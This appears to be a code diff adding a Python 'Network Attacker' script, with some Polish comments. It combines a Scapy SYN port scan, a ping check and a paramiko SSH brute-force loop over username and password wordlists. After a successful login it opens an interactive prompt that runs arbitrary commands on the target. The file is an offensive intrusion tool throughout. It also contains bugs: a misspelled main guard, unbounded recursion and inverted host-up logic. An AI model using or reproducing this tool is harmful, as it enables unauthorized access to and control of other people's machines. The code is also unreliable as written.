@@ -1,0 +1,109 @@
+"""
+Network Attacker
+"""
+
+import sys
+import scapy
+import paramiko
+import random
+from termcolor import colored
+from scapy.all import *
+from scapy.layers.inet import IP, TCP, ICMP
+
+conf.verb = 0
+target = input("Enter the target: ")
+registered_ports = range(1, 1024)
+open_ports = []
+
+
+
+'''
+Network Scanner 
+'''
+def scanport():
+    for dst_port in range(1, 1024):
+        src_port = random.randint(1024, 6553)
+        syn_packet = sr1(IP(dst=target) / TCP(sport=src_port, dport=dst_port, flags="S"), timeout=1, verbose=0)
+        if syn_packet is not None:
+            if syn_packet.haslayer(TCP):
+                if syn_packet.getlayer(TCP).flags == 0x12:
+                    open_ports.append(dst_port)
+                    print(f"Port {dst_port} is open")
+                    print(open_ports)
+                    rst_packet = sr(IP(dst=target) / TCP(sport=src_port, dport=dst_port, flags="R"), timeout=1, verbose=0)
+
+
+
+'''
+Checking Target Availability 
+'''
+
+def target_availability():
+    print("Pinging the target...")
+    ip = target
+    icmp = IP(dst=target)/ICMP()
+    resp = sr1(icmp,timeout=10)
+    if resp == None:
+        return target_availability()
+    else:
+        print( )
+
+
+'''
+The Main Functionality
+'''
+def check_target():
+    if target_availability() is True:
+        print("The host is down")
+    else:
+        print("The host is up")
+
+
+'''
+Paramiko Bruteforce
+'''
+users = open("users.txt").read().split("\n")
+passwd = open("passwd.txt").read().split("\n")
+target_bruteforce = target
+
+
+s = paramiko.SSHClient()
+s.set_missing_host_key_policy(paramiko.AutoAddPolicy) #program dodaje za nas target do known hosts
+
+
+def login_and_cli(user, password, hostname):
+    try:
+        s.connect(hostname=hostname, username=user, password=password)
+        print(colored(f"Login successful: {user}:{password}", "green"))
+        while True:
+            try:
+                cmd = input(colored("$> ", "red")) #pobieramy od uzytkownika komende ktora nas interesuje
+                if cmd.lower() == "exit":
+                    exit(0)
+                else:
+                    stdin, stdout, stderr = s.exec_command(cmd) #standard wejscie, standard wyjscie
+                    print(stdout.read().decode("utf-8"), stderr.read().decode("utf-8")) #dzieki decode jestesmy w stanie odczytac komendy po wbiciu na kaliego
+            except Exception as e:
+                print(e)
+        return True
+    except paramiko.ssh_exception.AuthenticationException as e:
+        print(e)
+        return False
+
+
+def looper():
+    for user in users:
+        for password in passwd:
+            print(f"[!]Trying {user}:{password}")
+            login_and_cli(user, password, target_bruteforce)
+
+
+
+def main():
+    scanport()
+    target_availability()
+    check_target()
+    looper()
+
+if _name_ == "_main_":
+         main()
